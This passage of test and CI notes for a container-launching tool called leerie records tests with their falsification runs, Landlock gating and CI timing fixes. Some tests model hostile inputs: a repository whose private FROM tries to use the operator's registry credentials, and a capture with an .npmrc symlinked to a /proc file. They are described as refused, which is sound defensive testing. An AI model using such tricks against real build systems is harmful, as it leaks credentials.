  `DOCKER_AUTH_CONFIG` in the environment (in `test_build_repo_image.py`).
  `build-push.sh --local-build` sweeps before its build: an unused
  `leerie-repo/…` image is gone by the build, and one a container holds
  refuses it with no build (2). The base build's failed prune warns,
  naming its namespace. `leerie_content_sharing_check` passes only for a
  config setting `content_sharing_policy` to "isolated" (v2 and v3
  quoting), and otherwise gives the file, the lines and the restart (7).
  The sweep's refusal names each container that holds a left image, its
  state and its remedy, `leerie stop` for a running one and `nerdctl rm
  <id>` for an exited one, and never `image rm` (2 of its 4 cases). The
  real launcher's local `stop` and `kill` follow with `nerdctl rm -f` of
  the container (2), as `resume`'s reaper does after its kill
  (`tests/test_oom_wedge_prevention.py::test_reaper_removes_what_it_killed`). With no BuildKit daemon answering, the refusal names
  the three addresses asked, buildctl's last error and the remedy.
  Opt-in: with a fake `docker-credential-secretservice` on PATH holding the
  operator's login, and then with the credential in `DOCKER_AUTH_CONFIG`,
  an attacking repository's private `FROM` through `build_repo_image`
  fails with 401 and the helper is never asked, while the same Dockerfile
  built directly with an empty config and the helper on PATH reads the
  file and asks it; on a containerd of the test's own, the config
  `_runtime_linux_containerd_config` writes refuses an ingest by digest
  with no body in another namespace, which containerd's default config
  accepts. Falsified live (measured 2026-11-03), each restored, each
  failing the cases it targets: the `config.json` write removed, or
  `DOCKER_AUTH_CONFIG=''` dropped from the first build (the stub sees
  them); the sweep's call removed from `build-push.sh`; the base prune's
  warning back to `|| true`; the check made to pass always; the holders'
  listing dropped; the `rm` dropped from `stop`, from `kill` or from the
  reaper; buildctl's
  stderr discarded again. Opt-in, live: the build's config left without
  `config.json` (the helper case read the file), `DOCKER_AUTH_CONFIG=''`
  dropped (the env case read it), and the installer's policy line dropped
  (the ingest succeeded).
  All 13 opt-in cases and the 9 under bash 3.2 passed on this tree
  (measured 2026-11-04, BuildKit 0.31.2, rootless nerdctl 2.3.5,
  containerd 2.2.2).
- `tests/test_image_steps_run_once.py` (5 functions) — a host-wide image
  step runs once, under a host lock (DESIGN §6 *A host-wide image step runs
  once, under a host lock*; the operator's live 0.44.0 launches: five
  launches on one checkout each exported the base to /tmp and loaded it at
  once). The launcher's own text, 5 launches at once against one stub
  image store kept in files: with no base, one base build and one frontend
  pull; on one checkout, one copy of the base (streamed, nothing in
  `TMPDIR`), one pull and one repository build, every launch ending with
  the image's digest and one warning of a shared content store; on five
  checkouts, one copy and one pull. `leerie_lock`: a second taker waits for
  the first's release and says so once; a launch SIGKILLed while holding it
  frees it within seconds though a child it started still runs, and leaves
  no ready file. Falsified live (2026-11-03), each restored: the lock
  dropped from the base build (more than one build), from the per-repo host steps (5
  loads on five checkouts), the checkout's lock dropped, the holder's
  liveness check removed. In `tests/test_build_repo_image.py`, the copy
  streams `save` into `load` and a failure of either side is logged with
  its stderr (2); falsified with `PIPESTATUS[0]` dropped.
- `tests/test_command_line_refused_before_images.py` (6 functions, 7
  cases) — a command line is refused before any image step (DESIGN §6 *A
  command line is refused before any image step*; the live `leerie
  promptresume <run-id> …`). The real launcher against a stub `nerdctl`:
  a garbled verb and a bad `--max-workers` end with the parser's message
  and status 2, no nerdctl command that builds, copies, inspects or runs
  an image, and no run (2); an accepted line still runs. Run, not read:
  `check_command_line` and `main` share `_parse_command_line` and
  `_leerie_arg_parser`; under `python3 -I -S` in an empty directory and
  HOME it spawns nothing, writes nothing and answers in under 5 s.
  Falsified live (2026-11-03): the launcher's `exit` on the check's
  status removed (the stub container ran). The check compiles a content
  once (review round 39, execution E4), on the launcher's own check
  program extracted verbatim:
  `test_the_check_runs_the_kept_code_object_of_its_source` swaps the
  entry kept under the source's key for another module's code object and
  the check answers with that module's status, so it runs the kept code;
  an edited source is a new entry with its own answer, and a broken entry
  is compiled again. `test_the_check_keeps_four_code_objects`: six
  contents leave four entries, the current one among them. Falsified
  (2026-11-04): a compile forced on every run fails the first, and only
  it.
- `tests/test_launch_runs_its_own_code.py` (3 test functions) — a launch
  runs only the leerie code it started with (DESIGN §6 *A launch runs only
  the leerie code it started with*; the 2026-11-03 upgrade under five
  running 0.43.0 runs). The launcher's own snapshot and staging spans and
  real `_run_argv`, against a fake `nerdctl` that, while "running", has
  the test replace the install's `landlock_exec.py` and then reads the
  shim through its `/opt/leerie-image` mount: it reads the old shim, from
  a copy under `~/.cache/leerie`, removed at exit. An install that changed
  version stops the launch before any container; the bring-back sources
  the launch's copy of `host-finalize.sh`. Falsified (2026-11-04), each
  failing its own test: `$LEERIE_REPO` mounted again, the version check
  dropped, the install's `host-finalize.sh` sourced.
  `tests/test_launcher_env_forwarding.py` and
  `tests/test_launcher_state_mount.py` stub `_code_dir`;
  `tests/test_run_repo_bring_back.py`'s launcher harnesses pass it.
- `tests/test_host_finalize_runs_its_own_code.py` (2 test functions) —
  `host-finalize.sh` runs the leerie code it was sourced from (review
  round 40, execution F1). test_host_finalize_rebase's harness, with the
  file sourced from a "snapshot" directory and `LEERIE_REPO` naming a
  different "install": the rebaser seam and `host_apply_captured_deps`
  are each given the snapshot's `orchestrator/leerie.py`, and the install's
  appears in neither. Falsified (2026-11-04): the two arguments back on
  `$LEERIE_REPO` fail both.
- `tests/test_launch_snapshot_is_one_commit.py` (7 test functions, 9
  cases) — the
  snapshot is one state of the install, and `LEERIE_COMMIT` names it
  (review round 39, execution E2 and E3). The launcher's snapshot span,
  verbatim: a clean checkout gives its commit's tree and short sha; a
  contributor's edit and a new prompt run, `LEERIE_COMMIT` is
  `<short>-dirty.<12 hex>`, `git archive <tree>` reproduces the snapshot,
  and nothing is staged; a non-git install is copied with an empty commit;
  a non-git install changed under the copy stops the launch; 25 snapshots
  while `git checkout` flips the install between two same-version commits:
  every accepted one is whole, one commit's and equal to the code its
  `LEERIE_COMMIT` names, and every other one stopped with its reason.
  Falsified (2026-11-04), one change at a time: a git checkout copied
  with `cp -pR` instead of archived fails the flipping test; edits
  recorded as the bare commit fail the edits test; the non-git copy left
  uncompared fails the changed-under-copy test. Review round 40: a
  checkout git refuses to read (`GIT_TEST_ASSUME_DIFFERENT_OWNER=1`, git's
  own hook for its ownership check) is copied with git's reason logged, no
  commit recorded and no "launch again" (execution F3); and a SIGINT or
  SIGTERM to the launch's process group, or a SIGKILL, while a stand-in
  `git` holds the snapshot in `add` leaves nothing in `~/.cache/leerie`
  once the EXIT trap or the next launch's `_sweep_stale_stages` has run
  (execution F2, isolation F2; 3 cases). Falsified (2026-11-04): the
  private index back in `~/.cache/leerie/idx-<pid>-*` fails the 3 signal
  cases; the old stop on an unreadable checkout fails the git case.
  `tests/test_leerie_commit.py`'s
  two launcher pins run the span (a git install: the short sha; no git:
  empty, status 0).
- `tests/test_capture_validation.py` — E2's proof turned around: the schema,
  `_filter_residual_deps`, `_capture_problems`, `_record_capture`,
  `_merge_capture_into_config`, `apply_captured_deps`, the launcher's apt
  layer (no glob expansion either) and the generator each refuse the
  hostile capture; the generator runs `_INSTALL_COMMANDS[manager]`, equal
  to `BAKE_INSTALL_COMMANDS`; nothing in a run's exit or fetch applies a
  capture, and `config --apply-capture <run>` applies one with a diff. A2:
  the generator reads the committed tree (a committed `.npmrc` link and an
  untracked `.npmrc` are neither read nor copied; one linked to
  `/proc/self/pagemap` no longer stops the launch) and hashes by blob id.
- `tests/committed_tree.py` — the harnesses that write a lockfile into a
  test checkout commit it first, since the generator reads `HEAD`.
- Review round 29 (execution H1, L3, L4).
  `tests/test_worker_root_view.py::test_localhost_resolves_and_answers_in_the_worker_view`
  (isolated; runs in the container): a worker root with no `/etc/hosts`
  (as no image snapshot has one), `getent hosts localhost` succeeds in the
  view and a server bound to `localhost` answers a client that dials it by
  name, the worker root's own copied python. Falsified in the container
  (rootless): with the view's `/etc` taken whole from the worker root
  again, it fails. `test_what_a_repository_installs_in_home_is_named` and
  `test_the_entry_stops_a_run_whose_worker_root_installs_in_home`: what a
  worker root holds beneath `/home/leerie` that the container's lacks is
  named (the base's own entries and a linked `home` are not), and the entry
  stops naming it and the fix. `tests/test_capture_validation.py::test_apply_refuses_a_merge_into_a_value_that_already_fails`
  (3 cases: barnacle's key names in `setup_packages`, `language_installs`
  that is not JSON, a manager leerie does not bake): a valid capture is
  refused, naming the entry, and nothing is written. Falsified on the host:
  with the two checks removed, the entry test and the 3 cases fail.

## A test of one gate pins every other gate its path takes (CI, 2026-11-04)

`tests/test_blt_semaphore.py::test_raising_the_cap_raises_the_peak` failed on
every GitHub leg that finished (run 41777003910: py3.11 and py3.12, `cap=4
peaked at 1`) and passed on every developer host. The measurement it drives
(`_measure_axes`, a `tests` axis) holds two gates, not one: `blt_parallel`
(`_blt_slot`), its subject, and a host build slot (`_build_class_slot`), whose
count with no measured peak is `(MemAvailable - 4 GiB) // 6.3 GiB`
(`_build_sem_slots`, `_WORKER_BUILD_PEAK_BYTES`) — one slot on any host with
under about 16.6 GiB available, which a 16 GB runner is. There the host gate
serialised the six measurements whatever `blt_parallel` said; on a 56 GiB
host it gives 8 slots and never binds. The code is right (one 6.3 GiB build
at a time is what that host can hold); the test measured a host fact.
`_peak_under` now pins the host gate wide (`blt_peak.slots` = the number of
measurements, read before memory), drops `LEERIE_HOST_DIR` so the slot files
live under the test's own state root, and pins `_mem_available_bytes` to a
14.5 GiB host, so removing the slot pin fails on every host, not only a small
one. Falsified: with only the memory pin added the test fails here as on CI
(`1 failed, 6 passed`); with the slot pin reverted it fails again; with both
it passes, serial and under `-n 4`.

## CI time: collection that re-split leerie.py, xdist and a per-test bound (2026-11-04)

No PR's test job finished after #296/#297: the last green run (40607416970)
took about 15 min, and run 41777003910 took 69 min (py3.12), 83 min (py3.11)
and over 120 (py3.10, cancelled at 96%). The per-leg time from the step's
start to its first test was 2.8, 29.1 and 48.5 min. That was collection:
`tests/test_needs_human_sources_render.py` derives its parameters at import
with one `ast.get_source_segment` per function of leerie.py, and that call
re-splits its whole source each time — on Python 3.10 and 3.11 a pure-Python
loop over every character. Measured on 3.11 against this tree: 0.91 s a call,
about 1,570 s for the module's 1,729 functions; split once, 0.07 s.
`tests/conftest.py::source_segments` is `ast.get_source_segment` with the
source split once; `tests/test_source_segments.py` pins it equal to the stdlib
on every node of a synthetic source holding each line-break shape `ast` and
`str.splitlines` disagree on, and on three functions of leerie.py, and fails
any file under `tests/` that calls `get_source_segment` itself (the two other
callers, `test_conformer_schema_shrink.py` and `test_phase_overlap_judge.py`,
moved too).

The workflow now runs `pytest -n 4 --timeout=600` with `pytest-xdist` and
`pytest-timeout` installed, and `timeout-minutes` is back to 60.
`tests/test_ci_test_workflow.py` pins the run line's `-n 4` and `--timeout`,
that each flag's plugin is in the install line, and that the per-test bound is
below the job's — then runs the line's own options against a one-test
directory where both plugins are installed, since an option no installed
plugin owns is a usage error that fails the job before any test. Neither
option is in `pytest.ini`: under `--strict-config` a plugin's option is an
error where the plugin is missing. A test that sets its own `SIGALRM`
(`tests/test_orchestrate_cleanup_bound.py`'s backstop) disarms
pytest-timeout's timer for its own duration only; the next test re-arms it.

Two suite-wide autouse fixtures in `tests/conftest.py` came with the per-test
bound, both measured on the first full local run under `--timeout=600`:

- `_no_process_outlives_its_test`. The bound ends a hung test by raising
  inside it, and `subprocess.run` then kills only its direct child: a run
  killed mid-test had already left the launcher's relay pipeline (`bash -c`
  over `_log.sh`, its `bash` subshells, `terminal-text.py`) reparented to
  init for hours. Neither parent nor process group is a handle on those
  (`_build_job` gives a build a group of its own), so every test sets
  `PYTEST_LEERIE_TEST_ID` to its own value, which every child inherits, and
  teardown SIGKILLs every process of the user's whose environment carries it
  (`processes_marked`, `kill_marked`; about 37 ms a test with 778 processes
  on the host). `tests/test_no_process_outlives_its_test.py` times a test
  out for real in an inner pytest whose shell started one grandchild in the
  test's session and one under `setsid`: with the fixture both are gone;
  without it both are alive (its anti-vacuity case). A process a child
  starts with a fresh environment escapes the marker. Linux only, both
  sides: `processes_marked` reads `/proc/<pid>/environ`, so it returns
  nothing where there is no `/proc` (a macOS dev host reads as "nothing
  left behind", as it did before the scan existed) and its test file is
  skipped off Linux, since `setsid` -- the arm a process-group kill would
  miss -- is not in base macOS. Shipped without those guards, the bare
  `os.listdir("/proc")` raised `FileNotFoundError` inside the autouse
  teardown and so errored the teardown of every test on macOS.
- **`needs_landlock` + `skip_without_landlock` (one owner,
  `tests/conftest.py`).** The kernel's Landlock ABI, read once at collection
  through the shim's own `abi()`. A test whose SUBJECT is the confinement
  carries **both** marks; they are inert on CI (ubuntu-latest reports
  ABI >= 3 and runs every one of them for real -- measured on the 0.44.7
  run: zero "no Landlock ABI 3" skips in 14,078 passes, the 135
  Landlock-area skips there being the unprivileged-userns gate,
  `setgroups: EACCES`, which is a different thing).
  The marker's definition was copied in five files; those five now import
  the pair from conftest. The consolidation is **partial on purpose**: the
  modules that gate a whole file on the kernel
  (`tests/test_worker_confinement.py`, `tests/test_tree_git_is_addressed.py`
  and their importers, `tests/test_user_scripts_on_path.py`,
  `tests/test_held_out_path_taken_is_not_a_refusal.py`, and the two
  remaining `_HAS_LANDLOCK` sites in
  `tests/test_confinement_refusal_stops_the_run.py`) still carry their own
  `_abi()` loader and skipif, so they skip on a host without Landlock and
  are not handed to a container. Migrating them is follow-up work, not
  something this change did.

  **Two marks, never one wrapping the other.**
  `pytest.mark.needs_landlock(pytest.mark.skipif(...))` reads as composition
  but is not: the skipif becomes an *argument* of the named mark, no skip is
  applied, and every confined test runs against a kernel that cannot confine
  (measured: 15 such failures, where the same files had been clean). The
  named mark is what the container runner looks for -- a bare skipif mark is
  named `skipif`, so a name lookup finds nothing -- and the skipif is what
  stops a test this host can neither run nor hand to a container.
  `tests/test_landlock_gate_wiring.py` guards both halves, mirroring
  `tests/test_jq_gate_wiring.py`: it fails if any `needs_landlock` test
  lacks a skip, and pins that the antipattern really is silent.

  **Where the host has no Landlock, the test runs where leerie runs.** With
  `LEERIE_TEST_CONTAINER_IMAGE` naming a leerie image and `nerdctl` on PATH,
  conftest's `pytest_collection_modifyitems` replaces the item's `setup` so
  the test is re-run inside that container and its verdict becomes the
  test's. Replacing `setup`, not hooking the call, is deliberate: a fixture
  of such a test may itself need the kernel (the signals module's
  module-scoped `outside` reads `/proc/self/status` and raised
  `StopIteration` at setup, before any body ran), so no local fixture is
  built at all. The child's environment has the variable cleared and the
  container's ABI is 4, so the marker is inert there and nothing recurses.
  Measured: the 5 `test_bstar_confirm` cases that shell out to
  `python3 -m pytest` pass this way, and a bad image fails loudly rather
  than passing. pytest is not in the image (it is a runtime image), so the
  runner installs it per run -- about 5 s.
  Why a gate and not an emulation: Landlock is a Linux LSM with no macOS
  equivalent (`sandbox-exec` is deprecated by Apple, and its profiles do
  not express leerie's grants), so emulating it would make a confinement
  test pass on a kernel that cannot confine -- a green tick over the one
  guarantee the shim exists to provide. leerie runs in a Linux container,
  so the subject is always on Linux in production; where a dev host has no
  Landlock the reason says to set `LEERIE_TEST_CONTAINER_IMAGE` and run
  them where they run (the same opt-in `tests/test_work_read_only.py` and
  `tests/test_pinned_runtime_runs.py` use). On macOS the Colima VM reports
  ABI 4, so the real feature is reachable from a dev host.
  Sixty-six tests were failing for want of this gate; twelve files carry it.
  Twelve came first: the five in `tests/test_bstar_confirm.py` that drive a
  real confined measurement, the three in
  `tests/test_collect_subtrees_sh.py` whose integrator the payload refuses
  to run unconfined, two in
  `tests/test_confinement_refusal_stops_the_run.py` that the file's own
  `_HAS_LANDLOCK` already gated its other tests with, and three of the four
  in `tests/test_commands_keep_default_signals.py`, which read a signal mask
  out of `/proc/self/status` through the `outside` fixture (its `_report`
  raised `StopIteration` as a collection error instead of saying why).
  Deliberately three and not the module: the fourth derives the
  ignored-signal list from a fresh interpreter, reads no `/proc` and passes
  on a macOS host, so a module mark would have skipped a test that works.

  Twenty-seven more came from the next file-widening, all of them a confined
  install or measurement that a host without Landlock cannot run: twenty-one
  of the twenty-nine in `tests/test_own_commands_leave_tracked_files.py`
  (the other eight exercise the snapshot helpers and submodule handling and
  need no kernel, so they stay running), three in
  `tests/test_pm_script_runner.py`, and `TestMainWiring`'s three in
  `tests/test_repo_change_warn_default.py`, which drive the real `main()`
  through to a measurement. Every one of the twenty-seven failed with
  `ConfinementRefused` and passes on Linux; eighteen of them had been
  failing on macOS for some time, and three only started once
  `install_seccomp` was fixed to raise `OSError` — before that the shim
  tracebacked and the failure was swallowed, so those three had never
  exercised their subject there at all.
  `test_a_tracked_file_a_command_replaced_with_a_directory_is_put_back` is
  gated per case (`pytest.param(..., marks=...)`, as
  `tests/test_confined_terminal.py` gates its `isolate` parameter): only the
  `edited` case runs a confined command, and a whole-function mark would
  have skipped a passing one.

  Twenty-seven more, in `tests/test_acceptance_gate.py` (23 functions), came
  from the same `install_seccomp` fix and were found the same way: that file
  read 67 failed before the fix and 92 after, and a `comm` of the failing
  test IDs named the 27 exactly. Every one of them passes on Linux, where
  `prctl` exists and the fix is a no-op, so on macOS they had been reporting
  a verdict the shim never actually produced. The file's other 58 failures
  are a separate, pre-existing shape and are left visible.
- `_quiet_host_pressure`. The B* confirm gate waits up to
  `confirm_gate_wait_sec` (300 s) a confirm for the HOST's CPU pressure to
  fall below `confirm_psi_cpu_max`. Tests not about that gate inherited the
  host's load: `tests/test_clean_tree_gate.py`'s two acceptance-repair tests
  took 559 s and 600 s (the second cut by the bound) on a loaded host,
  against 39 s on a quieter one, and 45 s and 36 s with the fixture. A read
  of the default `/proc/pressure/cpu` is a quiet host (0.0) for a test that
  uses the `leerie` fixture; a named file is still parsed; the gate's own
  tests opt out with `@pytest.mark.real_host_pressure`.
  `tests/test_bstar_confirm.py::test_conftest_makes_the_default_read_a_quiet_host`
  pins it.
